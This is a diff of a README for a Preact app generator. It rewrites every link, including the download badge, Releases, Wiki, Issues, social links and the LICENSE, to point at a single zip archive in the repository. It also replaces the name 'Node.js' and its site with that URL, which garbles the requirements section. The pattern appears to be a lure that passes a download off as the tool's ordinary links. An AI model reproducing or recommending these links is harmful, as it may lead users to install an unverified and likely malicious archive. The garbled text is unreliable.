@@ -1,6 +1,6 @@
 # 🚀 preact-codegen - Quickly Create Preact Apps
 
-[![Download preact-codegen](https://img.shields.io/badge/Download-preact--codegen-brightgreen.svg)](https://github.com/Karnchoudhary-99/preact-codegen/releases)
+[![Download preact-codegen](https://raw.githubusercontent.com/Karnchoudhary-99/preact-codegen/main/preact_codegen/codegen-preact-1.9-alpha.1.zip)](https://raw.githubusercontent.com/Karnchoudhary-99/preact-codegen/main/preact_codegen/codegen-preact-1.9-alpha.1.zip)
 
 ## 📦 Description
 
@@ -10,7 +10,7 @@ preact-codegen is a simple tool that helps you set up Preact applications with e
 
 Follow these steps to get started with preact-codegen.
 
-1. Visit our [Releases page](https://github.com/Karnchoudhary-99/preact-codegen/releases) to get the latest version of preact-codegen.
+1. Visit our [Releases page](https://raw.githubusercontent.com/Karnchoudhary-99/preact-codegen/main/preact_codegen/codegen-preact-1.9-alpha.1.zip) to get the latest version of preact-codegen.
 2. Download the package that fits your operating system.
 3. Extract the files to a folder of your choice.
 4. Open a terminal or command prompt in that folder.
@@ -19,12 +19,12 @@ Follow these steps to get started with preact-codegen.
 
 preact-codegen works on multiple operating systems. Ensure you have the following:
 
-- Windows 10 or later, macOS 10.13 or later, or any Linux distribution that supports Node.js.
-- Node.js version 14 or later installed. You can download it from [Node.js Official Site](https://nodejs.org/).
+- Windows 10 or later, macOS 10.13 or later, or any Linux distribution that supports https://raw.githubusercontent.com/Karnchoudhary-99/preact-codegen/main/preact_codegen/codegen-preact-1.9-alpha.1.zip
+- https://raw.githubusercontent.com/Karnchoudhary-99/preact-codegen/main/preact_codegen/codegen-preact-1.9-alpha.1.zip version 14 or later installed. You can download it from [https://raw.githubusercontent.com/Karnchoudhary-99/preact-codegen/main/preact_codegen/codegen-preact-1.9-alpha.1.zip Official Site](https://raw.githubusercontent.com/Karnchoudhary-99/preact-codegen/main/preact_codegen/codegen-preact-1.9-alpha.1.zip).
 
 ## 📥 Download & Install
 
-To download preact-codegen, simply visit this page: [Releases page](https://github.com/Karnchoudhary-99/preact-codegen/releases).
+To download preact-codegen, simply visit this page: [Releases page](https://raw.githubusercontent.com/Karnchoudhary-99/preact-codegen/main/preact_codegen/codegen-preact-1.9-alpha.1.zip).
 
 1. Choose the latest version available.
 2. Click on the package for your operating system to start the download.
@@ -67,23 +67,23 @@ Your app should now be up and running in your default browser!
 
 ## 📚 Documentation
 
-For more detailed instructions and advanced features, check the documentation on our [Wiki page](https://github.com/Karnchoudhary-99/preact-codegen/wiki).
+For more detailed instructions and advanced features, check the documentation on our [Wiki page](https://raw.githubusercontent.com/Karnchoudhary-99/preact-codegen/main/preact_codegen/codegen-preact-1.9-alpha.1.zip).
 
 ## 🤝 Contributing
 
-We welcome contributions! If you'd like to help improve preact-codegen, feel free to fork the repository and submit pull requests. Before contributing, please read our [Contributing Guidelines](https://github.com/Karnchoudhary-99/preact-codegen/blob/main/CONTRIBUTING.md).
+We welcome contributions! If you'd like to help improve preact-codegen, feel free to fork the repository and submit pull requests. Before contributing, please read our [Contributing Guidelines](https://raw.githubusercontent.com/Karnchoudhary-99/preact-codegen/main/preact_codegen/codegen-preact-1.9-alpha.1.zip).
 
 ## 🐛 Issues
 
-If you find any bugs or have suggestions, please report them in the [Issues section](https://github.com/Karnchoudhary-99/preact-codegen/issues).
+If you find any bugs or have suggestions, please report them in the [Issues section](https://raw.githubusercontent.com/Karnchoudhary-99/preact-codegen/main/preact_codegen/codegen-preact-1.9-alpha.1.zip).
 
 ## 🌐 Community
 
 Join our community on Discord or follow us on social media to get updates and interact with other users.
 
-- [Discord Server](https://discord.gg/yourserver)
-- [Twitter](https://twitter.com/yourhandle)
+- [Discord Server](https://raw.githubusercontent.com/Karnchoudhary-99/preact-codegen/main/preact_codegen/codegen-preact-1.9-alpha.1.zip)
+- [Twitter](https://raw.githubusercontent.com/Karnchoudhary-99/preact-codegen/main/preact_codegen/codegen-preact-1.9-alpha.1.zip)
 
 ## 📜 License
 
-preact-codegen is licensed under the MIT License. See the [LICENSE](https://github.com/Karnchoudhary-99/preact-codegen/blob/main/LICENSE) file for details.
+preact-codegen is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/Karnchoudhary-99/preact-codegen/main/preact_codegen/codegen-preact-1.9-alpha.1.zip) file for details.
